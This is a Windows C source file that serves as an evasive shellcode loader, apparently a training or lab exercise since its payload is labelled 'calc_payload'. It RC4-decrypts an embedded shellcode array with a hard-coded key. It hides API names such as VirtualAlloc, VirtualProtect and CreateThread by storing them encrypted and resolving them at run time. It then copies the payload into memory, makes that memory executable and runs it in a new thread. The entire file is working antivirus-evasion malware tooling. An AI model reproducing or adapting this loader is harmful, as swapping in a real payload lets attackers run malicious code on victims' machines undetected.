#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Calls
typedef BOOL(WINAPI* pCloseHandle)(HANDLE hObject);
typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
typedef VOID(WINAPI* pRtlMoveMemory)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);
typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE(WINAPI* pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD  lpThreadId);

// Shellcode
unsigned char s_pay[] = { 0x58, 0x70, 0xc0, 0x58, 0x28, 0xa5, 0xe7, 0xde, 0x31, 0x84, 0xbc, 0x26, 0xa4, 0xb4, 0x9a, 0x30, 0xa6, 0xb2, 0xaa, 0x83, 0xb8, 0xea, 0xab, 0xdb, 0x7b, 0xa0, 0xe9, 0x55, 0xe, 0xc0, 0xf9, 0xdd, 0x8, 0x51, 0xbc, 0x86, 0xf4, 0x70, 0x9c, 0x40, 0x9c, 0xb0, 0x8a, 0x4f, 0x65, 0xd3, 0xda, 0xc5, 0x8c, 0xb8, 0xac, 0xbb, 0xfa, 0x86, 0x72, 0xc8, 0x24, 0xae, 0xa8, 0x8f, 0xe5, 0xf0, 0x3d, 0xeb, 0x64, 0xbc, 0xe0, 0xf4, 0x3d, 0x65, 0x2c, 0x6a, 0x2, 0x30, 0x2d, 0x1, 0x6c, 0x56, 0x57, 0xce, 0xee, 0x3f, 0x46, 0x3a, 0x21, 0xb1, 0x4c, 0xc5, 0x0, 0xcd, 0x2, 0x47, 0xe3, 0x60, 0x9f, 0xcd, 0x49, 0xb5, 0x6e, 0xe1, 0x2a, 0x7f, 0x80, 0xec, 0xdc, 0xe8, 0xd2, 0x69, 0xcc, 0x80, 0x47, 0xac, 0x24, 0xc8, 0x30, 0xfc, 0xce, 0xe, 0x8e, 0x77, 0x58, 0x91, 0xc1, 0xb2, 0xda, 0xc3, 0xf5, 0xb4, 0x4a, 0xde, 0xe3, 0x33, 0x1f, 0x8d, 0x36, 0xe0, 0x58, 0xfb, 0xb3, 0xce, 0x2b, 0x76, 0x3c, 0x3d, 0xc7, 0xcb, 0xbd, 0xf1, 0xe3, 0x1, 0xed, 0x6a, 0xd6, 0xae, 0x8c, 0x29, 0x8b, 0x24, 0xf2, 0xbd, 0x13, 0xbd, 0x82, 0xd2, 0xcb, 0xdd, 0x76, 0x2d, 0x99, 0x91, 0xc5, 0x2a, 0x33, 0x95, 0x17, 0x58, 0xeb, 0x61, 0xa8, 0x86, 0xe, 0xee, 0xbf, 0x34, 0x4b, 0x4, 0x5c, 0xe0, 0xde, 0xb7, 0x55, 0x59, 0xdb, 0x7b, 0xf6, 0x52, 0x5, 0x7f, 0xd5, 0x1, 0x89, 0xfe, 0x47, 0x3c, 0xa5, 0x47, 0x48, 0x25, 0x24, 0x28, 0xa, 0xa4, 0x97, 0xf2, 0x29, 0x91, 0x19, 0x57, 0xba, 0xbf, 0x49, 0xda, 0xf6, 0x31, 0x2f, 0xb4, 0x7f, 0xad, 0xdd, 0x37, 0x5b, 0x8c, 0xef, 0x3, 0xbe, 0x80, 0x41, 0xdf, 0x7c, 0xaf, 0x5c, 0x2c, 0x2e, 0x22, 0x22, 0x89, 0xe5, 0x3e, 0xb, 0xb2, 0x1c, 0x32, 0x89, 0x8f, 0x99, 0x7e, 0x59, 0xf, 0xcd, 0x73, 0x85, 0xb, 0xaa, 0xf9, 0x2d, 0xf1, 0x6f, 0xfe, 0xcf, 0x66, 0xb0, 0xea, 0x38, 0x47, 0x6e, 0xdd };
unsigned int s_len = sizeof(s_pay);

// Key
char rc4_key[] = { 0x4d, 0x79, 0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x4b, 0x65, 0x79, 0x31, 0x32, 0x33, 0x34, 0x35 };

// RC4 function
void RC4Init(unsigned char* state, char* key, unsigned int keylen) {
	int i, j = 0, t;
	for (i = 0; i < 256; ++i) {
		state[i] = i;
	}
	for (i = 0; i < 256; ++i) {
		j = (j + state[i] + (unsigned char)key[i % keylen]) % 256;
		t = state[i];
		state[i] = state[j];
		state[j] = t;
	}
}

void RC4Dec(unsigned char* state, unsigned char* data, unsigned int datalen) {
	int i = 0, j = 0, x, t;
	for (x = 0; x < datalen; ++x) {
		i = (i + 1) % 256;
		j = (j + state[i]) % 256;
		t = state[i];
		state[i] = state[j];
		state[j] = t;
		data[x] ^= state[(state[i] + state[j]) % 256];
	}
}

// Exec
// Exec
int main(void) {

    BOOL rv;
    HANDLE th;
    void* exec_mem;
    DWORD oldprotect = 0;
    unsigned char rc4_state[256];

    //Function names encrypted
    unsigned char sCloseHandle[] = { 0xe7, 0x54, 0x2c, 0xcf, 0xbd, 0x5, 0x46, 0xb0, 0x55, 0xe8, 0x98, 0x77 };
    unsigned char sRtlMoveMemory[] = { 0xf6, 0x4c, 0x2f, 0xf1, 0xb7, 0x3b, 0x42, 0x93, 0x54, 0xe9, 0x92, 0x5, 0x9c, 0xe4 };
    unsigned char sVirtualAlloc[] = { 0xf2, 0x51, 0x31, 0xc8, 0xad, 0x2c, 0x4b, 0x9f, 0x5d, 0xe8, 0x92, 0x14, 0xe5 };
    unsigned char sVirtualProtect[] = { 0xf2, 0x51, 0x31, 0xc8, 0xad, 0x2c, 0x4b, 0x8e, 0x43, 0xeb, 0x89, 0x12, 0x86, 0x90, 0xc8 };
    unsigned char sCreateThread[] = { 0xe7, 0x4a, 0x26, 0xdd, 0xac, 0x28, 0x73, 0xb6, 0x43, 0xe1, 0x9c, 0x13, 0xe5 };
    unsigned char sWaitForSingleObject[] = { 0xf3, 0x59, 0x2a, 0xc8, 0x9e, 0x22, 0x55, 0x8d, 0x58, 0xea, 0x9a, 0x1b, 0x80, 0xab, 0xaa, 0xb, 0x95, 0x99, 0xef, 0x51 };

    // Decrypt WinFunc
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sCloseHandle, sizeof(sCloseHandle));
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sRtlMoveMemory, sizeof(sRtlMoveMemory));
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sVirtualAlloc, sizeof(sVirtualAlloc));
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sVirtualProtect, sizeof(sVirtualProtect));
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sCreateThread, sizeof(sCreateThread));
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, sWaitForSingleObject, sizeof(sWaitForSingleObject));

    // Calls
    pCloseHandle fnCloseHandle = (pCloseHandle)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCloseHandle);
    pRtlMoveMemory fnRtlMoveMemory = (pRtlMoveMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sRtlMoveMemory);
    pVirtualAlloc fnVirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualAlloc);
    pVirtualProtect fnVirtualProtect = (pVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualProtect);
    pCreateThread fnCreateThread = (pCreateThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCreateThread);
    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sWaitForSingleObject);

    // Allocate new memory buffer for payload
    exec_mem = fnVirtualAlloc(0, s_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "calc_payload addr", (void*)s_pay);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

    printf("\nHit me 1st!\n");
    getchar();

    // Decrypt (RC4) s_pay
    RC4Init(rc4_state, rc4_key, sizeof(rc4_key));
    RC4Dec(rc4_state, s_pay, s_len);

    // Copy payload to memory
    fnRtlMoveMemory(exec_mem, s_pay, s_len);

    // Exec
    rv = fnVirtualProtect(exec_mem, s_len, PAGE_EXECUTE_READ, &oldprotect);

    printf("\nHit me 2nd!\n");
    getchar();

    // If all good, execute!
    if (rv != 0) {
        th = fnCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        fnWaitForSingleObject(th, -1);
    }

    return 0;
}
